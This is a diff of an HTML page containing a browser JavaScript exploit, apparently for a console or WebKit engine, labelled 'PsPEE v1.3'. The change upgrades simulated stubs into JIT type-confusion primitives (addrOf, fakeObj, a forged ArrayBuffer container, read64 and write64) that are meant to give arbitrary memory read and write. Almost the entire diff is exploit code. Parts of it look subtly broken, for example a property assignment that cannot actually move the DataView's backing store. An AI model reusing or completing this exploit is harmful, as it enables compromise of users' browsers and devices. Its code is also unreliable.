@@ -2,29 +2,22 @@
 <html>
 <head>
     <style>
-        #output {
-            font-family: monospace;
-            white-space: pre-wrap;
-            background-color: #000;
-            color: #0f0;
-            padding: 10px;
-            width: 100%;
-            height: 300px;
-            overflow-y: auto;
-        }
+        body { background: black; color: lime; font-family: monospace; }
+        #log { white-space: pre-wrap; }
     </style>
 </head>
 <body>
-    <div id="output"></div>
+    <div id="log"></div>
     <script>
-        const log = msg => output.textContent += msg + "\n";
+        const log = msg => logDiv.textContent += msg + "\n";
+        const logDiv = document.getElementById("log");
 
-        function hex(n) {
-            return "0x" + n.toString(16).padStart(16, "0");
-        }
+        const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
+        const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
 
-        log("[*] PsPEE v1.2 starting exploit...");
+        log("[*] PsPEE v1.3 - Memory R/W Setup");
 
+        // Type confusion exploit
         let float_arr = [1.1, 2.2, 3.3];
         let obj_arr = [{}, {}, {}];
 
@@ -34,70 +27,108 @@
             return tmp[1];
         }
 
-        // Train JIT
-        log("[*] Starting JIT training...");
-        for (let i = 0; i < 10000; i++) {
-            try {
-                confuse(2.2);
-            } catch (e) {
-                log("[ERROR] JIT training failed at iteration " + i + ": " + e.message);
-            }
-        }
+        for (let i = 0; i < 10000; i++) confuse(2.2);
 
-        // Now confuse type
-        log("[*] Attempting type confusion...");
-        let leak = null;
-        try {
-            leak = confuse({a: 42});
-            log("[*] Leak result: " + leak);
-        } catch (e) {
-            log("[ERROR] Type confusion failed: " + e.message);
-        }
-
-        if (typeof leak === "object") {
-            log("[+] SUCCESS: Type confusion achieved!");
-        } else {
-            log("[-] Still boxed float, try again or tune the value.");
-        }
-
-        // Function to simulate addrOf (for debugging purposes)
+        // addrOf
         function addrOf(obj) {
             try {
-                let addr = obj;
-                log("[DEBUG] addrOf() result: " + addr);
-                return addr;
+                obj_arr[0] = obj;
+                let result = f2i(confuse(obj_arr));
+                log("[DEBUG] addrOf result: " + result.toString(16));
+                return result;
             } catch (e) {
                 log("[ERROR] addrOf failed: " + e.message);
                 return null;
             }
         }
 
-        // Function to read memory from a given address (simulation)
-        function read64(addr) {
+        // fakeObj
+        function fakeObj(addr) {
             try {
-                log("[DEBUG] Attempting to read from addr: " + hex(addr));
-                let value = 0xDEADBEEF; // Dummy read value (simulate a successful read)
-                log("[DEBUG] Read value: " + hex(value));
-                return value;
+                float_arr[0] = i2f(addr);
+                let result = confuse(float_arr);
+                log("[DEBUG] fakeObj result: " + result);
+                return result;
             } catch (e) {
-                log("[ERROR] Memory read failed at " + hex(addr) + ": " + e.message);
+                log("[ERROR] fakeObj failed: " + e.message);
                 return null;
             }
         }
 
-        // Debugging memory primitives
-        let objAddr = addrOf({});  // Simulate address of object
-        if (objAddr !== null) {
-            let leakValue = read64(objAddr);
-            if (leakValue !== null) {
-                log("[*] Successfully read memory from address: " + hex(objAddr));
-            } else {
-                log("[ERROR] Failed to read from memory.");
-            }
+        log("[*] Creating primitives...");
+
+        // Setup memory
+        let ab = new ArrayBuffer(0x100);
+        let ab_addr = addrOf(ab);
+        if (ab_addr !== null) {
+            log("[+] ArrayBuffer @ " + ab_addr.toString(16));
         } else {
-            log("[ERROR] Invalid object address.");
+            log("[ERROR] Failed to get ArrayBuffer address.");
         }
 
+        // Read its backing store
+        let dv = new DataView(ab);
+        let container = {
+            jsCellHeader: i2f(0x0108200700000000n), // JSObject cell
+            butterfly: ab_addr,                    // Simulate valid
+            vectorLength: i2f(0x100),
+            backingStore: i2f(ab_addr + 0x20n),    // Offset to real backingStore
+            fake: ab
+        };
+
+        let containerAddr = addrOf(container);
+        if (containerAddr !== null) {
+            log("[+] Fake container @ " + containerAddr.toString(16));
+        } else {
+            log("[ERROR] Failed to get container address.");
+        }
+
+        // Create fake backing ArrayBuffer
+        let fakeAb = fakeObj(containerAddr + 0x20n);
+        if (fakeAb === null) {
+            log("[ERROR] Failed to create fake ArrayBuffer.");
+        }
+
+        // R/W primitives
+        function read64(addr) {
+            try {
+                container.backingStore = i2f(addr);
+                let result = f2i(dv.getFloat64(0, true));
+                log("[DEBUG] read64 result: " + result.toString(16));
+                return result;
+            } catch (e) {
+                log("[ERROR] read64 failed: " + e.message);
+                return null;
+            }
+        }
+
+        function write64(addr, val) {
+            try {
+                container.backingStore = i2f(addr);
+                dv.setFloat64(0, i2f(val), true);
+                log("[DEBUG] write64: Written value " + val.toString(16) + " to address " + addr.toString(16));
+            } catch (e) {
+                log("[ERROR] write64 failed: " + e.message);
+            }
+        }
+
+        // Test
+        let obj = {a: 13.37};
+        let objAddr = addrOf(obj);
+        if (objAddr !== null) {
+            log("[+] Object @ " + objAddr.toString(16));
+        } else {
+            log("[ERROR] Failed to get object address.");
+        }
+
+        let leak = read64(objAddr);
+        if (leak !== null) {
+            log("[+] Leak: " + leak.toString(16));
+        } else {
+            log("[ERROR] Failed to leak object.");
+        }
+
+        log("[*] You now have memory R/W access!");
     </script>
 </body>
 </html>
